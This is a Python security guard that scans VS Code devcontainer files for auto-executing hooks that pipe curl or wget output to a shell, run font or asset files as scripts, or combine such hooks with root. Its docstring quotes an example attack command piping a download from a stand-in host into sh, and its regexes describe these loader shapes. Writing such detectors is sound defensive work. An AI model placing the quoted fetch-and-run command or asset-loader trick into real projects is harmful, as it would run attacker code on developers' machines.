"""Guard C — VS Code Dev Container auto-run configuration.

Detects dangerous *auto-execution* configuration in ``.devcontainer`` files,
which are JSONC and whose ``postCreateCommand`` / ``postStartCommand`` /
``postAttachCommand`` hooks run code automatically when a container is
(re)started. This is a known attack surface: the incident delivered a
JavaScript payload via an auto-executing VS Code task; the same class of
abuse exists for devcontainers.

Scope (explicit, intentionally narrow):
  * files: ``.devcontainer/devcontainer.json``, ``.devcontainer.json``,
    ``.devcontainer/<name>/devcontainer.json`` (no recursion into unrelated
    directories)
  * command value forms accepted by the devcontainer spec:
    - string: a single shell command line
    - array:  a list of shell command lines (joined with ``&&`` for scanning)
    - object: an object with a ``"command"`` key
  * signals checked across the *whole* command string (no prefix bypass):
    - pipes a network fetch to a shell: ``curl ... | (sh|bash|pwsh|iex)``,
      ``wget ... | (sh|bash)`` — including after an allow-listed prefix
      (``npm ci && curl evil.test | sh`` is caught)
    - executes a binary/asset path rather than a manifest: ``node
      ./public/fonts/x.woff2``, ``node ./dist/setup.js``
    - ``remoteUser`` / ``containerUser`` set to ``root`` *combined with* any
      exec hook (root alone is not flagged)

ALLOWED patterns (suppress noise only — they do NOT short-circuit danger
checks; a command matching the allow-list is still scanned):
  * npm ci / yarn install / pnpm install (with flags)
  * cargo build / check / fmt / clippy / test (with flags)
  * rustup component add
  * apt-get update / install, apt update / install (incl. sudo)
  * bun install, pip install, deno install

False-positive policy (documented):
  * A devcontainer with no auto-exec hook passes.
  * Valid spec forms (string / array / object) are all understood.
  * ``node ./scripts/x.js`` and other project scripts under ``scripts/``
    are NOT flagged — only asset-like extensions and asset/seed dirs
    (``public/fonts/``, ``dist/``, ``assets/``) are.
  * If ``.devcontainer/`` does not exist, the guard prints
    ``inspected 0 file(s)`` and exits 0 — this repo currently has no
    devcontainer, so the guard is preventive only; its effectiveness is
    verified by fixtures, not a live target.

NOT claimed:
  - Does NOT scan Dockerfile ``RUN``/``ENTRYPOINT`` (separate concern).
  - Does NOT cover user-level VS Code devcontainer overrides, extensions
    that inject tasks, or remote-SSH behavior.
  - Does NOT execute or interpret the commands it inspects.
  - Is NOT a general malware detector — it targets the specific
    auto-execution patterns this incident used.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sys
from pathlib import Path


# Commands that are ordinary, manifest-driven bootstrap — not suspicious on
# their own. Anchored with $ so an allow-listed tool must be the ENTIRE
# command line; anything appended (&&, ;, newline, env assignment) falls
# through to the danger checks below. NOTE: the allow-list does NOT
# short-circuit danger checks — it only suppresses the "not in allow-list"
# noise for known-good single commands.
SAFE_BOOTSTRAP_PATTERNS: list[str] = [
    r"^\s*npm\s+ci\s*$",
    r"^\s*yarn\s+install\s*(?:--.*)?$",
    r"^\s*pnpm\s+install\s*(?:--.*)?$",
    r"^\s*cargo\s+build\s*(?:--.*)?$",
    r"^\s*cargo\s+check\s*(?:--.*)?$",
    r"^\s*cargo\s+fmt\s*(?:--.*)?$",
    r"^\s*cargo\s+clippy\s*(?:--.*)?$",
    r"^\s*cargo\s+test\s*(?:--.*)?$",
    r"^\s*rustup\s+component\s+add\s+.+$",
    r"^\s*sudo\s+apt-get\s+update\s*$",
    r"^\s*sudo\s+apt-get\s+install\s+-y\s+.+$",
    r"^\s*sudo\s+apt\s+update\s*$",
    r"^\s*sudo\s+apt\s+install\s+-y\s+.+$",
    r"^\s*apt-get\s+update\s*$",
    r"^\s*apt-get\s+install\s+-y\s+.+$",
    r"^\s*apt\s+update\s*$",
    r"^\s*apt\s+install\s+-y\s+.+$",
    r"^\s*bun\s+install\s*$",
    r"^\s*pip\s+install\s+(?:-[^\s]+\s+)*.+$",
    r"^\s*deno\s+install\s*$",
]
_SAFE_BOOTSTRAP = re.compile("|".join(SAFE_BOOTSTRAP_PATTERNS), re.IGNORECASE)

# Suspicious: network-fetch tool piped to a shell, ANYWHERE in the command
# (including after allow-listed prefixes and inside command substitutions).
FETCH_AND_RUN = re.compile(
    r"(?:curl|wget|Invoke-WebRequest|irm)\b.*\|\s*(?:sh|bash|pwsh|iex)\b",
    re.IGNORECASE | re.DOTALL,
)

# Suspicious: execute a binary/asset path rather than a manifest tool.
# Narrowed so legitimate project scripts (node ./scripts/x.js) pass.
RUNS_ASSET = re.compile(
    # interpreter + path with an asset-like extension, anywhere
    r"(?<![\w./])(?:node|sh|bash|pwsh)\s+\S*\.(?:woff2?|ttf|otf|eot|llf)\b(?:\s|$|;|&|\|)",
    re.IGNORECASE,
)
# interpreter + a .js under an asset/seed directory (the incident shape)
RUNS_ASSET_SEED = re.compile(
    r"(?<![\w./])(?:node|sh|bash|pwsh)\s+\S*(?:^|/)(?:dist|public/fonts|assets)/\S*\.js\b",
    re.IGNORECASE,
)
# interpreter + ./path with .js that is NOT under scripts/ (project scripts)
RUNS_ASSET_DOT_JS = re.compile(
    r"(?<![\w./])(?:node|sh|bash|pwsh)\s+\./+(?!scripts/)\S*\.js\b",
    re.IGNORECASE,
)

HOOK_KEYS = (
    "postCreateCommand", "postStartCommand", "postAttachCommand",
    "onCreateCommand", "initializeCommand", "updateContentCommand",
)


def _candidate_files() -> list[str]:
    """Return likely devcontainer.json paths relative to repo root.

    Does NOT recurse into arbitrary directories.
    """
    return [
        ".devcontainer/devcontainer.json",
        ".devcontainer.json",
    ]


def _devcontainer_dirs(root: str) -> list[str]:
    """Named devcontainer folders under .devcontainer/ (e.g. .devcontainer/name/)."""
    base = os.path.join(root, ".devcontainer")
    out: list[str] = []
    if os.path.isdir(base):
        for name in os.listdir(base):
            p = os.path.join(base, name, "devcontainer.json")
            if os.path.isdir(os.path.join(base, name)) and os.path.isfile(p):
                out.append(p)
    return out


def strip_jsonc(text: str) -> str:
    """Minimal JSONC stripper: removes // and /* */ comments + trailing commas."""
    out: list[str] = []
    i, n = 0, len(text)
    in_str, esc = False, False
    while i < n:
        ch = text[i]
        if in_str:
            out.append(ch)
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == '"':
                in_str = False
            i += 1
            continue
        if ch == '"':
            in_str = True
            out.append(ch)
            i += 1
            continue
        if ch == "/" and i + 1 < n and text[i + 1] == "/":
            while i < n and text[i] not in "\r\n":
                i += 1
            continue
        if ch == "/" and i + 1 < n and text[i + 1] == "*":
            i += 2
            while i + 1 < n and not (text[i] == "*" and text[i + 1] == "/"):
                i += 1
            i += 2
            continue
        out.append(ch)
        i += 1
    stripped = "".join(out)
    cleaned: list[str] = []
    j, m = 0, len(stripped)
    in_str, esc = False, False
    while j < m:
        ch = stripped[j]
        if in_str:
            cleaned.append(ch)
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == '"':
                in_str = False
            j += 1
            continue
        if ch == '"':
            in_str = True
            cleaned.append(ch)
            j += 1
            continue
        if ch == ",":
            k = j + 1
            while k < m and stripped[k] in " \t\r\n":
                k += 1
            if k < m and stripped[k] in "}]":
                j += 1
                continue
        cleaned.append(ch)
        j += 1
    return "".join(cleaned)


def _normalize_commands(val) -> list[str]:
    """Extract command strings from a devcontainer hook value.

    Accepts every form the devcontainer spec allows:
      - str  -> returned as-is (one command)
      - list -> each element is a separate command line (array form)
      - dict -> dict["command"] (string or list) is used
    Returns a list of normalized command strings (empty if no command).
    """
    if isinstance(val, str):
        return [val]
    if isinstance(val, list):
        return [str(p) if not isinstance(p, str) else p for p in val]
    if isinstance(val, dict):
        cmd = val.get("command")
        if cmd is None:
            return []
        if isinstance(cmd, str):
            return [cmd]
        if isinstance(cmd, list):
            return [str(p) if not isinstance(p, str) else p for p in cmd]
        return []
    return []


def _is_safe_bootstrap(cmd: str) -> bool:
    """True only if the *entire* command matches an allow-listed pattern."""
    return _SAFE_BOOTSTRAP.match(cmd) is not None


def check_command(cmd: str, key: str, rel: str, errors: list[str]) -> None:
    """Run all danger-pattern checks against a full command string.

    The allow-list does NOT short-circuit — danger patterns are always
    evaluated on the whole string, so 'npm ci && curl | sh' is caught.
    """
    cmd = cmd.strip()
    if not cmd:
        return

    problems: list[str] = []
    if FETCH_AND_RUN.search(cmd):
        problems.append(f"pipes a network fetch to a shell ({cmd[:80]!r})")
    if RUNS_ASSET.search(cmd):
        problems.append(f"executes a binary/asset path ({cmd[:80]!r})")
    if RUNS_ASSET_SEED.search(cmd):
        problems.append(
            f"executes a .js file from an asset/seed directory ({cmd[:80]!r})"
        )
    if RUNS_ASSET_DOT_JS.search(cmd):
        problems.append(
            f"executes a .js file outside scripts/ ({cmd[:80]!r})"
        )

    for p in problems:
        errors.append(f"{rel}: {key} {p}")


def check_devcontainer(path: str, errors: list[str], rel: str) -> None:
    """Inspect a single devcontainer.json. Appends human-readable error strings."""
    try:
        raw = Path(path).read_text(encoding="utf-8")
    except OSError as exc:
        errors.append(f"{rel}: cannot read file: {exc}")
        return
    try:
        data = json.loads(strip_jsonc(raw))
    except json.JSONDecodeError as exc:
        errors.append(f"{rel}: invalid JSON/JSONC: {exc}")
        return
    if not isinstance(data, dict):
        errors.append(f"{rel}: top-level JSON must be an object")
        return

    hooks_found: list[str] = []
    for key in HOOK_KEYS:
        val = data.get(key)
        if val is None:
            continue
        if not isinstance(val, (str, list, dict)):
            errors.append(
                f"{rel}: {key} must be a string, array, or object, "
                f"got {type(val).__name__}"
            )
            continue

        cmds = _normalize_commands(val)
        if not cmds:
            continue
        hooks_found.append(key)
        for cmd in cmds:
            check_command(cmd, key, rel, errors)

    # root user only matters if combined with an exec hook
    user = data.get("remoteUser") or data.get("containerUser")
    if user in ("root", "0") and hooks_found:
        errors.append(
            f"{rel}: runs as root (remoteUser/containerUser={user}) combined with "
            f"auto-exec hooks: {', '.join(hooks_found)}"
        )


def main() -> int:
    parser = argparse.ArgumentParser(description="devcontainer auto-run guard")
    parser.add_argument("--root", default=".", help="repository root")
    parser.add_argument("--paths", nargs="*", default=None,
                        help="explicit devcontainer.json paths (fail loud if any missing)")
    args = parser.parse_args()

    errors: list[str] = []
    inspected: list[str] = []

    if args.paths:
        missing = [p for p in args.paths if not os.path.isfile(p)]
        if missing:
            for p in missing:
                print(f"::error file={p}::explicitly requested devcontainer.json path does not exist")
            return 1
        targets = [(p, os.path.relpath(p, args.root)) for p in args.paths]
    else:
        targets = []
        for rel in _candidate_files():
            abs_p = os.path.join(args.root, rel)
            if os.path.isfile(abs_p):
                targets.append((abs_p, rel))
        for abs_p in _devcontainer_dirs(args.root):
            try:
                rel = os.path.relpath(abs_p, args.root)
            except ValueError:
                rel = abs_p
            targets.append((abs_p, rel))

    for path, rel in targets:
        if os.path.isfile(path):
            inspected.append(rel)
            check_devcontainer(path, errors, rel)

    for err in errors:
        print(f"::error::{err}")
    print(f"inspected {len(inspected)} devcontainer file(s), {len(errors)} problem(s)")
    return 1 if errors else 0


if __name__ == "__main__":
    sys.exit(main())
